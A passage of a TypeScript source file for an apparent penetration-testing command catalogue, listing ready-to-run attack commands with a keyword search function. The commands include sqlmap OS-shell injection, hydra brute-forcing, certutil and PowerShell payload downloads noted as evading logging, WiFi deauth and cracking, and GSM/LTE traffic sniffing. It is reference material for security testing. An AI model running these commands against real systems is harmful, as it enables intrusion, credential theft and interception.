    command: 'nikto -h http://10.10.10.10 -port 80,443,8080',
    description: 'Classic web server misconfiguration and file checks.',
    tags: ['web', 'http', 'vuln scan', 'enum']
  },
  {
    tool: 'Web',
    title: 'SQLMap (GET)',
    command: "sqlmap -u 'http://10.10.10.10/page?id=1' --batch --level 3 --risk 2 --dbs",
    description: 'Automated SQL injection detection and database extraction.',
    tags: ['web', 'sqli', 'injection', 'exploit']
  },
  {
    tool: 'Web',
    title: 'SQLMap (request file)',
    command: 'sqlmap -r request.txt --batch --os-shell',
    description: 'Replay a captured request (from Burp) straight into sqlmap.',
    tags: ['web', 'sqli', 'injection', 'exploit']
  },
  {
    tool: 'Web',
    title: 'WhatWeb fingerprint',
    command: 'whatweb http://10.10.10.10 --color=never',
    description: 'Identify CMS, frameworks, JS libs and server banners.',
    tags: ['web', 'http', 'recon', 'fingerprint']
  },
  {
    tool: 'Web',
    title: 'Header inspection',
    command: 'curl -sI http://10.10.10.10',
    description: 'Server, redirects, cookies and security headers in one line.',
    tags: ['web', 'http', 'recon']
  },
  {
    tool: 'Web',
    title: 'Leak file checks',
    command:
      "for f in robots.txt sitemap.xml .git/HEAD .env; do echo \"== $f\"; curl -s -o /dev/null -w '%{http_code}\\n' http://10.10.10.10/$f; done",
    description: 'Quick status sweep of files that should not be public.',
    tags: ['web', 'recon', 'http', 'enum']
  },
  {
    tool: 'Web',
    title: 'WPScan WordPress',
    command: 'wpscan --url http://10.10.10.10 --enumerate u,vp',
    description: 'WordPress users, plugins and known vulnerabilities.',
    tags: ['web', 'cms', 'vuln scan', 'enum']
  },
  {
    tool: 'Web',
    title: 'Gobuster vhosts',
    command:
      'gobuster vhost -u http://10.10.10.10 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain',
    description: 'Virtual host enumeration with gobuster instead of ffuf.',
    tags: ['web', 'vhost', 'subdomain', 'brute force']
  },

  /* ---------------------------------------------------------------- */
  /* Password attacks                                                  */
  /* ---------------------------------------------------------------- */
  {
    tool: 'Password attacks',
    title: 'SSH brute (hydra)',
    command: 'hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 4',
    description: 'SSH login attempts — keep threads at 4 to avoid lockouts.',
    tags: ['brute force', 'password', 'ssh', 'spray']
  },
  {
    tool: 'Password attacks',
    title: 'RDP brute (hydra)',
    command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10 -V',
    description: 'RDP credential testing with live output.',
    tags: ['brute force', 'password', 'rdp']
  },
  {
    tool: 'Password attacks',
    title: 'HTTP form brute',
    command:
      'hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V',
    description: 'Brute a web login form; adjust the failure string to your app.',
    tags: ['brute force', 'password', 'http', 'web']
  },
  {
    tool: 'Password attacks',
    title: 'FTP brute (hydra)',
    command: 'hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10',
    description: 'Classic FTP login brute force.',
    tags: ['brute force', 'password', 'ftp']
  },
  {
    tool: 'Password attacks',
    title: 'MySQL brute (hydra)',
    command: 'hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.10.10.10',
    description: 'Database login attempts against exposed MySQL.',
    tags: ['brute force', 'password', 'database']
  },
  {
    tool: 'Password attacks',
    title: 'Medusa parallel brute',
    command: 'medusa -h 10.10.10.10 -U users.txt -P rockyou.txt -M ssh',
    description: 'Parallel modular brute forcing across many services.',
    tags: ['brute force', 'password', 'ssh']
  },
  {
    tool: 'Password attacks',
    title: 'Patator scripted brute',
    command: 'patator ssh_login host=10.10.10.10 user=user pass_file=/usr/share/wordlists/rockyou.txt',
    description: 'Highly scriptable brute force engine with tight output control.',
    tags: ['brute force', 'password', 'ssh']
  },

  /* ---------------------------------------------------------------- */
  /* Shells & transfers                                                */
  /* ---------------------------------------------------------------- */
  {
    tool: 'Transfers',
    title: 'File server (Python)',
    command: 'python3 -m http.server 8000',
    description: 'Serve the current directory for targets to pull tooling from.',
    tags: ['transfer', 'http', 'server', 'staging']
  },
  {
    tool: 'Transfers',
    title: 'Netcat listener',
    command: 'nc -lvnp 4444',
    description: 'Catch incoming reverse shells or file transfers.',
    tags: ['shell', 'transfer', 'listener']
  },
  {
    tool: 'Transfers',
    title: 'Windows download (certutil)',
    command: 'certutil -urlcache -f http://10.10.10.10/tool.exe tool.exe',
    description: 'Fetch files on Windows without triggering PowerShell logging.',
    tags: ['transfer', 'windows', 'download', 'staging']
  },
  {
    tool: 'Transfers',
    title: 'PowerShell download',
    command: "(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','file.exe')",
    description: 'Inline .NET download — paste into a PowerShell prompt.',
    tags: ['transfer', 'windows', 'download', 'powershell', 'staging']
  },
  {
    tool: 'Transfers',
    title: 'Base64 over raw shell',
    command: 'cat file | base64 -w0 | nc -lvnp 5555',
    description: 'Move files through a shell that has no other channel.',
    tags: ['transfer', 'encoding', 'shell']
  },
  {
    tool: 'Transfers',
    title: 'SCP copy over SSH',
    command: 'scp file user@10.10.10.10:/tmp/',
    description: 'Push a file to a compromised host over SSH.',
    tags: ['transfer', 'ssh']
  },
  {
    tool: 'Transfers',
    title: 'Drop file on share',
    command: "smbclient //10.10.10.10/share -U 'CORP\\user%Passw0rd!' -c 'put payload.exe'",
    description: 'Stage a payload onto an writable SMB share.',
    tags: ['transfer', 'smb', 'windows', 'staging']
  },
  /* ---------------------------------------------------------------- */
  /* WiFi — wireless audit, capture, cracking                          */
  /* ---------------------------------------------------------------- */
  {
    tool: 'WiFi',
    title: 'Enable monitor mode',
    command: 'airmon-ng check kill && airmon-ng start wlan0',
    description: 'Kill NetworkManager wpa_supplicant and put the adapter into monitor mode (wlan0mon).',
    tags: ['wifi', 'wireless', 'monitor mode', 'aircrack', 'recon']
  },
  {
    tool: 'WiFi',
    title: 'Survey nearby networks',
    command: 'airodump-ng wlan0mon',
    description: 'List APs and clients on the band — BSSID, channel, encryption and signal for target selection.',
    tags: ['wifi', 'wireless', 'recon', 'discovery', 'airodump']
  },
  {
    tool: 'WiFi',
    title: 'Capture WPA handshake (deauth)',
    command: 'aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon',
    description: 'Deauth clients of the target AP to force a reassociation and capture the 4-way handshake.',
    tags: ['wifi', 'wireless', 'deauth', 'handshake', 'aircrack']
  },
  {
    tool: 'WiFi',
    title: 'Crack WPA/WPA2 handshake',
    command: 'aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap',
    description: 'Dictionary-attack the captured handshake offline against your wordlist.',
    tags: ['wifi', 'wireless', 'wpa', 'cracking', 'aircrack']
  },
  {
    tool: 'WiFi',
    title: 'Scan for WPS-enabled APs',
    command: 'wash -i wlan0mon',
    description: 'Find access points with WPS open — the fastest wifi password attack path.',
    tags: ['wifi', 'wireless', 'wps', 'recon']
  },
  {
    tool: 'WiFi',
    title: 'WPS PIN attack',
    command: 'reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv',
    description: 'Brute-force the WPS PIN of a vulnerable AP to recover the WPA passphrase.',
    tags: ['wifi', 'wireless', 'wps', 'reaver', 'cracking']
  },
  {
    tool: 'WiFi',
    title: 'Capture PMKID / handshakes',
    command: 'hcxdumptool -i wlan0mon -w wlan.pcapng',
    description: 'Active capture of PMKID and handshakes from nearby clients without deauth storms.',
    tags: ['wifi', 'wireless', 'pmkid', 'hcx', 'capture']
  },
  {
    tool: 'WiFi',
    title: 'PMKID capture → hashcat',
    command: 'hcxpcapngtool -o wlan.22000 wlan.pcapng && hashcat -m 22000 wlan.22000 wordlist.txt',
    description: 'Convert hcx pcapng to the 22000 format and crack it with hashcat on the GPU.',
    tags: ['wifi', 'wireless', 'pmkid', 'hashcat', 'cracking']
  },
  {
    tool: 'WiFi',
    title: 'WiFi recon + MITM (bettercap)',
    command: 'bettercap -iface wlan0 -eval "wifi.recon on; wifi.ap on"',
    description: 'Enumerate wifi clients, sniff probes and optionally spoof an open evil-twin AP.',
    tags: ['wifi', 'wireless', 'bettercap', 'mitm', 'evil twin']
  },
  {
    tool: 'WiFi',
    title: 'Wireless IDS (kismet)',
    command: 'kismet -c wlan0mon',
    description: 'Passive wireless IDS — tracks APs, clients, rogue hotspots and intrusion events over time.',
    tags: ['wifi', 'wireless', 'kismet', 'ids', 'recon']
  },
  {
    tool: 'WiFi',
    title: 'Targeted deauth (mdk4)',
    command: 'mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF',
    description: 'Fast standards-compliant deauth of one BSSID — alternative to aireplay-ng.',
    tags: ['wifi', 'wireless', 'deauth', 'mdk4']
  },
  {
    tool: 'WiFi',
    title: 'Bluetooth LE device scan',
    command: 'sudo bettercap -iface hci0 -eval "ble.recon on"',
    description: 'Enumerate nearby BLE devices — badges, locks, trackers and IoT beacons in scope.',
    tags: ['bluetooth', 'ble', 'recon', 'wireless', 'bettercap']
  },

  /* ---------------------------------------------------------------- */
  /* LTE / eNodeB — RAN and core-network testing                       */
  /* ---------------------------------------------------------------- */
  {
    tool: 'LTE / eNodeB',
    title: 'Scan nearby LTE cells',
    command: 'cell_search -b 1 -b 3',
    description: 'srsRAN cell search — lists eNodeBs on the band with EARFCN, PCI and RSRP for survey.',
    tags: ['lte', 'enodeb', 'ran', 'srsran', 'recon', 'telecom']
  },
  {
    tool: 'LTE / eNodeB',
    title: 'Survey LTE radio conditions',
    command: 'srssurvey -b 3',
    description: 'Measure serving and neighbour cell power across a band to pick the best cell to emulate.',
    tags: ['lte', 'enodeb', 'srsran', 'survey', 'telecom']
  },
  {
    tool: 'LTE / eNodeB',
    title: 'Start a local EPC (core)',
    command: 'sudo srsepc epc.conf',
    description: 'Bring up a lab Evolved Packet Core — HSS/MME/SPGW — for authorized UE testing.',
    tags: ['lte', 'epc', 'core', 'srsran', 'telecom', '4g']
  },
  {
    tool: 'LTE / eNodeB',
    title: 'Start an eNodeB (base station)',
    command: 'sudo srsenb enb.conf',
    description: 'Run a software eNodeB on an SDR (or ZMQ) — the base station side of a controlled test setup.',
    tags: ['lte', 'enodeb', 'du', 'ran', 'srsran', 'telecom', '4g']
  },
  {
    tool: 'LTE / eNodeB',
    title: 'Attach a test UE (phone)',
    command: 'sudo srsue ue.conf',
    description: 'Simulated user equipment that attaches to your eNodeB/EPC — validates auth and data path.',
    tags: ['lte', 'ue', 'srsran', 'telecom', '4g']
  },
  {
    tool: 'LTE / eNodeB',
    title: 'Capture S1AP signalling',
    command: 'tshark -i any -f "sctp and port 36412" -Y s1ap',
    description: 'Sniff eNodeB ↔ MME S1AP traffic — handovers, attaches and identity requests.',
    tags: ['lte', 's1ap', 'sctp', 'telecom', 'signalling', '4g']
  },
  {
    tool: 'LTE / eNodeB',
    title: 'Scan SCTP on core networks',
    command: 'nmap -sY -p 36412,3868 10.0.0.1',
    description: 'SCTP port sweep for S1AP (36412) and Diameter (3868) on an EPC/MME host.',
    tags: ['lte', 'sctp', 'diameter', 'telecom', 'port scan', '4g']
  },
  {
    tool: 'LTE / eNodeB',
    title: 'Sniff GTP-U user data',
    command: 'tshark -i eth0 -f "udp port 2152" -w gtpu.pcap',
    description: 'Capture GTP-U tunnels between RAN and core — subscriber data in transit.',
    tags: ['lte', 'gtp', 'telecom', 'capture', 'core']
  },
  {
    tool: 'LTE / eNodeB',
    title: 'Read Diameter events',
    command: 'tshark -i any -f "sctp and port 3868" -Y diameter',
    description: 'Follow Diameter signalling (S6a, Rx, Gx) — auth, charging and policy exchanges.',
    tags: ['lte', 'diameter', 'telecom', 'signalling', 'core']
  },
  {
    tool: 'LTE / eNodeB',
    title: 'OsmocomBB baseband (2G phone)',
    command: 'osmocon -m c123xor -p /dev/ttyUSB0',
    description: 'Flash/attach a compatible 2G handset (OsmocomBB) for authorized GSM research.',
    tags: ['gsm', '2g', 'osmocom', 'telecom', 'baseband']
  },

  /* ---------------------------------------------------------------- */
  /* SDR / RF — software defined radio, ISM, GSM sniffing              */
  /* ---------------------------------------------------------------- */
  {
    tool: 'SDR / RF',
    title: 'Receive 433 MHz ISM traffic',
    command: 'rtl_433 -f 433.92M -A',
    description: 'Decode OOK/FSK sensors, doorbells and remotes on the 433 MHz ISM band with an RTL-SDR.',
    tags: ['sdr', 'rf', 'ism', '433mhz', 'rtl-sdr', 'radio']
  },
  {
    tool: 'SDR / RF',
    title: 'Record an IQ band (HackRF)',
    command: 'hackrf_transfer -r rx.iq -f 433920000 -s 8000000 -l 16',
    description: 'Record raw IQ samples of a band to a file for offline analysis in inspectrum or GNU Radio.',
    tags: ['sdr', 'rf', 'hackrf', 'iq', 'radio', 'capture']
  },
  {
    tool: 'SDR / RF',
    title: 'Analyse IQ recordings',
    command: 'inspectrum rx.iq',
    description: 'Waterfall and spectrogram analysis of captured IQ — spot bursts, modulation and timing.',
    tags: ['sdr', 'rf', 'iq', 'inspectrum', 'radio', 'analysis']
  },
  {
    tool: 'SDR / RF',
    title: 'GNU Radio flowgraph editor',
    command: 'gnuradio-companion',
    description: 'Build transmit/receive chains — protocol decoders, jammers and custom radio experiments.',
    tags: ['sdr', 'rf', 'gnuradio', 'radio', 'flowgraph']
  },
  {
    tool: 'SDR / RF',
    title: 'Live GSM downlink monitor',
    command: 'grgsm_livemon -f 935.8M',
    description: 'Tune a GSM C0 downlink and stream frames over GSMTAP — listen to a GSM carrier with SDR.',
    tags: ['gsm', 'sdr', 'rf', 'gr-gsm', 'telecom', 'radio']
  },
  {
    tool: 'SDR / RF',
    title: 'Read GSMTAP frames in Wireshark',
    command: 'tshark -i lo -f "udp port 4729" -w gsm.pcap',
    description: 'Capture the GSMTAP stream grgsm_livemon emits on localhost for protocol dissection.',
    tags: ['gsm', 'gsmtap', 'telecom', 'wireshark', 'capture']
  },
  {
    tool: 'SDR / RF',
    title: 'Find USRP devices',
    command: 'uhd_find_devices',
    description: 'Discover connected Ettus USRPs — serial, addrs and names before starting a flowgraph.',
    tags: ['sdr', 'rf', 'uhd', 'usrp', 'radio']
  },
  {
    tool: 'SDR / RF',
    title: 'USRP sample capture',
    command: 'rx_samples_to_file --freq 915e6 --rate 1e6 --type float --nsamps 1000000 rx.bin',
    description: 'Pull one million samples at 915 MHz from a USRP to disk for offline work.',
    tags: ['sdr', 'rf', 'uhd', 'usrp', 'iq', 'capture']
  },
  {
    tool: 'SDR / RF',
    title: 'Transceiver console (rfcat)',
    command: 'rfcat -r',
    description: 'Interactive TX/RX on sub-GHz bands with a Yard Stick One — replay, fuzz and probe devices.',
    tags: ['sdr', 'rf', 'rfcat', 'sub-ghz', 'radio', 'replay']
  },
  {
    tool: 'SDR / RF',
    title: 'BLE scan (hcitool)',
    command: 'sudo hcitool lescan',
    description: 'List advertising Bluetooth LE devices — quick check before bettercap deep recon.',
    tags: ['bluetooth', 'ble', 'wireless', 'recon', 'sdr']
  },

  /* ---------------------------------------------------------------- */
  /* Microwave — licensed/unlicensed backhaul radios                   */
  /* ---------------------------------------------------------------- */
  {
    tool: 'Microwave',
    title: 'Identify radio vendor (SNMP)',
    command: 'snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.1',
    description: 'Walk sysDescr first — tells you Ubiquiti, MikroTik, Cambium or Tarana before deeper probes.',
    tags: ['microwave', 'backhaul', 'snmp', 'recon', 'radio']
  },
  {
    tool: 'Microwave',
    title: 'Ubiquiti airOS info (SNMP)',
    command: 'snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.4.1.10002.1',
    description: 'Walk the UBNT-SMI-MIB — model, firmware, link metrics and SSID of an airOS radio.',
    tags: ['microwave', 'ubiquiti', 'airos', 'snmp', 'backhaul', 'radio']
  },
  {
    tool: 'Microwave',
    title: 'MikroTik neighbor info (SNMP)',
    command: 'snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.4.1.14988.1',
    description: 'Walk the MikroTik MIB — RouterOS identity, interfaces and wireless peers of a radio.',
    tags: ['microwave', 'mikrotik', 'routeros', 'snmp', 'backhaul', 'radio']
  },
  {
    tool: 'Microwave',
    title: 'Default-cred check on airOS',
    command: 'ssh ubnt@10.0.0.1',
    description: 'Test factory default credentials (ubnt/ubnt) still live on dish radios — a classic backhaul miss.',
    tags: ['microwave', 'ubiquiti', 'default creds', 'ssh', 'backhaul']
  },
  {
    tool: 'Microwave',
    title: 'airOS status API',
    command: 'curl -sk https://10.0.0.1/api/stat/device',
    description: 'Pull radio status JSON — frequency, capacity, station count and noise floor.',
    tags: ['microwave', 'ubiquiti', 'airos', 'api', 'backhaul']
  },
  {
    tool: 'Microwave',
    title: 'Backhaul throughput test',
    command: 'iperf3 -c 10.0.99.2 -R -P 4',
    description: 'Measure real throughput and stability across the link — validates a suspected degraded hop.',
    tags: ['microwave', 'backhaul', 'iperf', 'performance', 'radio']
  },
  {
    tool: 'Microwave',
    title: 'Find link partners (LLDP/CDP)',
    command: 'nmap -sn 10.0.0.0/24 && lldpctl',
    description: 'Map the L2 segment and read LLDP neighbours — dishes often expose the far-end radio.',
    tags: ['microwave', 'backhaul', 'lldp', 'cdp', 'recon', 'network']
  },

  // ---- cloud penetration testing ------------------------------------------
  {
    tool: 'AWS',
    title: 'Confirm caller identity',
    command: 'aws sts get-caller-identity',
    description: 'Who am I in this account — the first command of any AWS pentest (ARN + account id).',
    tags: ['cloud', 'aws', 'identity', 'recon', 'whoami']
  },
  {
    tool: 'AWS',
    title: 'Enumerate IAM users',
    command: "aws iam list-users --query 'Users[].UserName' --output text",
    description: 'List all IAM users for target enumeration and password-spray scoping.',
    tags: ['cloud', 'aws', 'iam', 'enum', 'recon']
  },
  {
    tool: 'AWS',
    title: 'List S3 buckets',
    command: 'aws s3api list-buckets',
    description: 'Discover all buckets visible to the credential — check each for public/read ACLs.',
    tags: ['cloud', 'aws', 's3', 'storage', 'enum']
  },
  {
    tool: 'AWS',
    title: 'Enumerate EC2 instances',
    command:
      "aws ec2 describe-instances --query 'Reservations[].Instances[].{IP:PrivateIpAddress,ID:InstanceId,Name:Tags[0].Value}'",
    description: 'Map the compute footprint — private IPs and names feed pivoting decisions.',
    tags: ['cloud', 'aws', 'ec2', 'enum', 'recon']
  },
  {
    tool: 'AWS',
    title: 'Enumerate Lambda functions',
    command: "aws lambda list-functions --query 'Functions[].FunctionName' --output text",
    description: 'Serverless surface — hunt for hardcoded secrets and over-permissive execution roles.',
    tags: ['cloud', 'aws', 'lambda', 'serverless', 'enum']
  },
  {
    tool: 'AWS',
    title: 'List Secrets Manager secrets',
    command: "aws secretsmanager list-secrets --query 'SecretList[].Name' --output text",
    description: 'Find stored secrets (needs secretsmanager:ListSecrets) — high-value escalation targets.',
    tags: ['cloud', 'aws', 'secrets', 'iam', 'enum']
  },
  {
    tool: 'Azure',
    title: 'Get ARM access token',
    command: 'az account get-access-token --query accessToken -o tsv',
    description: 'Bearer token for the current identity — feed it to az rest / curl API calls.',
    tags: ['cloud', 'azure', 'identity', 'token', 'whoami']
  },
  {
    tool: 'Azure',
    title: 'Enumerate role assignments',
    command: 'az role assignment list --all',
    description: 'Who can do what across subscriptions — spot Owner/Contributor over-grants.',
    tags: ['cloud', 'azure', 'rbac', 'iam', 'enum']
  },
  {
    tool: 'Azure',
    title: 'List all resources',
    command: "az resource list --query '[].{name:name,type:type,rg:resourceGroup}' -o table",
    description: 'Full inventory of resources and resource groups the identity can see.',
    tags: ['cloud', 'azure', 'enum', 'recon', 'inventory']
  },
  {
    tool: 'Azure',
    title: 'List App Service web apps',
    command: "az webapp list --query '[].{name:name,url:defaultHostName}' -o table",
    description: 'Find hosted web apps and their default hostnames for web testing.',
    tags: ['cloud', 'azure', 'web', 'app-service', 'enum']
  },
  {
    tool: 'Azure',
    title: 'List Key Vault URIs',
    command: "az keyvault list --query '[].vaultUri' -o tsv",
    description: 'Key vaults often hold TLS keys and connection strings — enumerate then probe access.',
    tags: ['cloud', 'azure', 'keyvault', 'secrets', 'enum']
  },
  {
    tool: 'Azure',
    title: 'Enumerate Entra ID users (Graph)',
    command: "az rest --method get --url 'https://graph.microsoft.com/v1.0/users?$top=999'",
    description: 'Directory users via Microsoft Graph — scope for password spraying and spray targets.',
    tags: ['cloud', 'azure', 'entra', 'graph', 'ad', 'enum']
  },
  {
    tool: 'GCP',
    title: 'Check active identity',
    command: 'gcloud auth list',
    description: 'Which GCP account/SA key you are acting as before touching anything else.',
    tags: ['cloud', 'gcp', 'identity', 'whoami', 'recon']
  },
  {
    tool: 'GCP',
    title: 'List projects',
    command: 'gcloud projects list',
    description: 'Projects the identity can reach — the blast radius of a stolen GCP credential.',
    tags: ['cloud', 'gcp', 'projects', 'enum', 'recon']
  },
  {
    tool: 'GCP',
    title: 'Enumerate service accounts',
    command: 'gcloud iam service-accounts list',
    description: 'Service accounts and their emails — targets for key impersonation attacks.',
    tags: ['cloud', 'gcp', 'iam', 'service-account', 'enum']
  },
  {
    tool: 'GCP',
    title: 'List Cloud Functions',
    command: 'gcloud functions list',
    description: 'Serverless entry points — review triggers and runtime for injection/secrets.',
    tags: ['cloud', 'gcp', 'functions', 'serverless', 'enum']
  },
  {
    tool: 'GCP',
    title: 'List compute instances',
    command: 'gcloud compute instances list',
    description: 'VM inventory with internal IPs — plan lateral movement inside the VPC.',
    tags: ['cloud', 'gcp', 'compute', 'enum', 'recon']
  },
  {
    tool: 'Cloud scanners',
    title: 'Prowler audit — AWS',
    command: 'prowler aws',
    description: 'Full CIS/PCI/aws-foundations benchmark audit of the account; writes CSV/HTML findings.',
    tags: ['cloud', 'aws', 'prowler', 'audit', 'scanner', 'misconfig']
  },
  {
    tool: 'Cloud scanners',
    title: 'Prowler audit — Azure',
    command: 'prowler azure',
    description: 'Benchmark audit for Azure subscriptions — identity, storage, network and SQL checks.',
    tags: ['cloud', 'azure', 'prowler', 'audit', 'scanner', 'misconfig']
  },
  {
    tool: 'Cloud scanners',
    title: 'Prowler audit — GCP',
    command: 'prowler gcp',
    description: 'Benchmark audit for GCP projects — IAM, logging, storage and compute checks.',
    tags: ['cloud', 'gcp', 'prowler', 'audit', 'scanner', 'misconfig']
  },
  {
    tool: 'Cloud scanners',
    title: 'ScoutSuite multi-cloud report',
    command: 'scout aws --report-dir ./scout-report',
    description: 'HTML posture report — swap aws for azure/gcp; great for client-facing evidence.',
    tags: ['cloud', 'scoutsuite', 'audit', 'report', 'scanner']
  },
  {
    tool: 'Cloud scanners',
    title: 'CloudFox attack-path mapping',
    command: 'cloudfox aws',
    description: 'Maps IAM attack paths, public assets and bastion hosts — swap aws for azure/gcp.',
    tags: ['cloud', 'cloudfox', 'attack-path', 'enum', 'scanner']
  },
  {
    tool: 'Cloud scanners',
    title: 'Pacu AWS exploitation framework',
    command: 'pacu --session anzika',
    description: 'Metasploit-style AWS framework — inside the session run `run <module>` and `set regions all`.',
    tags: ['cloud', 'aws', 'pacu', 'exploitation', 'framework']
  },
  {
    tool: 'Cloud scanners',
    title: 'S3 bucket spray from wordlist',
    command: 's3scanner scan --bucket-file buckets.txt',
    description: 'Probe a wordlist of bucket names for existence and public read/write.',
    tags: ['cloud', 'aws', 's3', 'scanner', 'enum']
  },
  {
    tool: 'Containers / K8s',
    title: 'List all containers',
    command: 'docker ps -a',
    description: 'Every container (incl. stopped) on the host — stopped ones often leak secrets in layers.',
    tags: ['cloud', 'docker', 'containers', 'enum', 'recon']
  },
  {
    tool: 'Containers / K8s',
    title: 'List local images',
    command: 'docker images',
    description: 'Image inventory — hunt stale base images and internal registries.',
    tags: ['cloud', 'docker', 'images', 'enum']
  },
  {
    tool: 'Containers / K8s',
    title: 'Shell into a container',
    command: 'docker exec -it <container> /bin/sh',
    description: 'Interactive foothold inside the container for enumeration and breakout attempts.',
    tags: ['cloud', 'docker', 'containers', 'shell', 'foothold']
  },
  {
    tool: 'Containers / K8s',
    title: 'List pods across namespaces',
    command: 'kubectl get pods -A -o wide',
    description: 'All pods cluster-wide with node placement — map the workload surface.',
    tags: ['cloud', 'kubernetes', 'k8s', 'pods', 'enum']
  },
  {
    tool: 'Containers / K8s',
    title: 'List secrets in the cluster',
    command: 'kubectl get secrets -A',
    description: 'Service-account tokens and app secrets — check RBAC before reading any.',
    tags: ['cloud', 'kubernetes', 'k8s', 'secrets', 'enum']
  },
  {
    tool: 'Containers / K8s',
    title: 'Audit my RBAC permissions',
    command: 'kubectl auth can-i --list',
    description: 'What the current identity can do — spot escalate-to-admin paths (impersonate, create pods).',
    tags: ['cloud', 'kubernetes', 'k8s', 'rbac', 'iam']
  },
  {
    tool: 'Containers / K8s',
    title: 'Hunter — Kubernetes cluster scan',
    command: 'kube-hunter --remote <target-ip>',
    description: 'Scans a remote cluster for exposed APIs, dashboards and node vulnerabilities.',
    tags: ['cloud', 'kubernetes', 'k8s', 'scanner', 'recon']
  },
  {
    tool: 'Containers / K8s',
    title: 'Trivy scan a directory (secrets + IaC)',
    command: 'trivy fs .',
    description: 'Scans the current directory for leaked secrets, CVEs and misconfigured IaC files.',
    tags: ['cloud', 'trivy', 'secrets', 'iac', 'scanner']
  }
];

export const COMMANDS: PentestCommand[] = RAW.map((cmd, index) => ({
  ...cmd,
  id: `cmd-${index}`,
  domain: TOOL_DOMAIN[cmd.tool] ?? DOMAIN_CUSTOM
}));

/** Unique tool groups in catalog order. */
export const COMMAND_TOOLS: string[] = [...new Set(COMMANDS.map((c) => c.tool))];

/** Minimal stemmer so "scanning" matches "scan" and "ports" matches "port". */
function stems(token: string): string[] {
  const out = new Set<string>([token]);
  if (token.length > 4 && token.endsWith('ing')) out.add(token.slice(0, -3));
  if (token.length > 4 && token.endsWith('ed')) out.add(token.slice(0, -2));
  if (token.length > 3 && token.endsWith('es')) out.add(token.slice(0, -2));
  if (token.length > 3 && token.endsWith('s')) out.add(token.slice(0, -1));
  return [...out].filter((t) => t.length >= 2);
}

/** Keyword search across title, tags, description, tool and the command itself. */
export function searchCommands(query: string, extra: PentestCommand[] = []): PentestCommand[] {
  const base = extra.length > 0 ? [...extra, ...COMMANDS] : COMMANDS;
  const q = query.trim().toLowerCase();
  if (!q) return base;
  const tokens = q.split(/\s+/);
  return base.filter((cmd) => {
    const hay =
      `${cmd.title} ${cmd.tool} ${domainOf(cmd)} ${cmd.description} ${cmd.tags.join(' ')} ${cmd.command}`.toLowerCase();
    return tokens.every((token) => stems(token).some((stem) => hay.includes(stem)));
  });
}
